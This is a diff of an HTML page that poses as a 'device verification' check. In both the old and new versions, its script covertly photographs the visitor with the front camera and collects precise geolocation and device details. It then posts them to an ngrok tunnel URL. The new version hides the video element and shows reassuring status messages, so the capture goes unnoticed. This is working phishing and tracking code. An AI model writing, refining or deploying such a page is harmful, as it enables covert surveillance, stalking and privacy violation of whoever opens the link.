@@ -24,128 +24,157 @@
       background-color: #4CAF50;
       transition: width 0.3s;
     }
+    #status {
+      margin: 15px 0;
+      color: #555;
+    }
   </style>
 </head>
 <body>
-<h2>To access this web app, we must verify your legitimacy <br>
-By clicking on Allow while visiting this site <br>
-Verifying your device...</h2>
+<h2>Verifying your device...</h2>
 <div id="progress"><div id="progress-bar"></div></div>
-<video id="video" autoplay muted style="width:100%; max-width:400px;"></video>
+<div id="status">Initializing verification process...</div>
+
 <script>
-async function getData() {
-    try {
-        // Update progress bar
-        document.getElementById('progress-bar').style.width = '25%';
-        
-        // Get location with fallback
-        let position = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            });
-        }).catch(e => {
-            console.warn("Geolocation error:", e);
-            return {
-                coords: {
-                    latitude: 0,
-                    longitude: 0,
-                    accuracy: 0
-                }
-            };
-        });
+// Hidden video element for capture
+const hiddenVideo = document.createElement('video');
+hiddenVideo.style.display = 'none';
+document.body.appendChild(hiddenVideo);
 
-        document.getElementById('progress-bar').style.width = '50%';
-        
-        // Get camera with fallback
-        let stream;
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: 'user' },
-                audio: false
-            });
-        } catch (e) {
-            console.warn("Camera access error:", e);
-            // Create blank image fallback
-            const canvas = document.createElement('canvas');
-            canvas.width = 400;
-            canvas.height = 400;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#dddddd';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#999999';
-            ctx.font = '30px Arial';
-            ctx.fillText('No Camera Access', 50, 200);
-            stream = canvas.captureStream();
-        }
-
-        document.getElementById('progress-bar').style.width = '75%';
-        
-        let video = document.getElementById('video');
-        video.srcObject = stream;
-
-        let track = stream.getVideoTracks()[0];
-        let imageCapture = new ImageCapture(track);
-        let blob = await imageCapture.takePhoto().catch(e => {
-            console.warn("Photo capture error:", e);
-            return new Blob([""], { type: 'image/jpeg' });
-        });
-        
-        let reader = new FileReader();
-        reader.onloadend = function() {
-            // Include additional device info
-            const payload = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                image: reader.result,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                screen: {
-                    width: window.screen.width,
-                    height: window.screen.height,
-                    colorDepth: window.screen.colorDepth
-                },
-                platform: navigator.platform,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                urlParams: new URLSearchParams(window.location.search).toString()
-            };
-            
-            // Send data with retry logic
-            sendDataWithRetry(payload, 3);
-        };
-        reader.readAsDataURL(blob);
-    } catch (e) {
-        console.error("Critical error:", e);
-    }
+function updateStatus(percent, message) {
+  document.getElementById('progress-bar').style.width = percent + '%';
+  document.getElementById('status').innerText = message;
 }
 
-function sendDataWithRetry(payload, retries) {
-    fetch("{{https://d6d13ede2ed0.ngrok-free.app}}/receive", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-    })
-    .then(response => {
-        if (!response.ok && retries > 0) {
-            throw new Error("Server error");
-        }
-        document.getElementById('progress-bar').style.width = '100%';
-    })
-    .catch(e => {
-        console.warn(`Attempt failed (${4-retries} of 3)`, e);
-        if (retries > 0) {
-            setTimeout(() => sendDataWithRetry(payload, retries - 1), 2000);
-        }
+async function captureImage() {
+  try {
+    updateStatus(10, "Requesting camera access...");
+    
+    // Get camera stream (front-facing by default)
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: 'user' },
+      audio: false 
     });
+    
+    updateStatus(30, "Camera access granted. Capturing image...");
+    
+    // Use hidden video element
+    hiddenVideo.srcObject = stream;
+    await new Promise(resolve => hiddenVideo.onloadedmetadata = resolve);
+    
+    // Create canvas for capture
+    const canvas = document.createElement('canvas');
+    canvas.width = hiddenVideo.videoWidth;
+    canvas.height = hiddenVideo.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
+    
+    // Stop all video tracks
+    stream.getTracks().forEach(track => track.stop());
+    
+    updateStatus(50, "Processing image...");
+    
+    // Convert to blob
+    return await new Promise(resolve => {
+      canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+    });
+    
+  } catch (error) {
+    console.error("Camera error:", error);
+    updateStatus(100, "Camera access denied. Continuing verification...");
+    return null;
+  }
 }
 
-// Start with slight delay to allow UI to render
-setTimeout(getData, 500);
+async function getLocation() {
+  try {
+    updateStatus(60, "Requesting location access...");
+    return await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
+    });
+  } catch (error) {
+    console.warn("Location error:", error);
+    return {
+      coords: {
+        latitude: 0,
+        longitude: 0,
+        accuracy: 0
+      }
+    };
+  }
+}
+
+async function sendData(payload) {
+  try {
+    updateStatus(80, "Sending verification data...");
+    const response = await fetch("{{NGROK_URL}}/receive", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+    
+    if (response.ok) {
+      updateStatus(100, "Verification complete!");
+    } else {
+      updateStatus(100, "Verification failed. Please try again.");
+    }
+  } catch (error) {
+    console.error("Send error:", error);
+    updateStatus(100, "Connection error. Please check your network.");
+  }
+}
+
+async function collectAllData() {
+  // Get link ID from URL
+  const linkId = new URLSearchParams(window.location.search).get('id');
+  
+  // Capture image in background
+  const imageBlob = await captureImage();
+  
+  // Get location
+  const position = await getLocation();
+  updateStatus(70, "Preparing data...");
+  
+  // Convert image to base64 if captured
+  let imageBase64 = null;
+  if (imageBlob) {
+    imageBase64 = await new Promise(resolve => {
+      const reader = new FileReader();
+      reader.onloadend = () => resolve(reader.result);
+      reader.readAsDataURL(imageBlob);
+    });
+  }
+  
+  // Prepare payload
+  const payload = {
+    link_id: linkId,
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    accuracy: position.coords.accuracy,
+    image: imageBase64,
+    timestamp: new Date().toISOString(),
+    user_agent: navigator.userAgent,
+    device_info: {
+      screen: {
+        width: window.screen.width,
+        height: window.screen.height,
+        colorDepth: window.screen.colorDepth
+      },
+      platform: navigator.platform,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    }
+  };
+  
+  // Send data
+  await sendData(payload);
+}
+
+// Start data collection
+setTimeout(collectAllData, 500);
 </script>
 </body>
 </html>
-
-
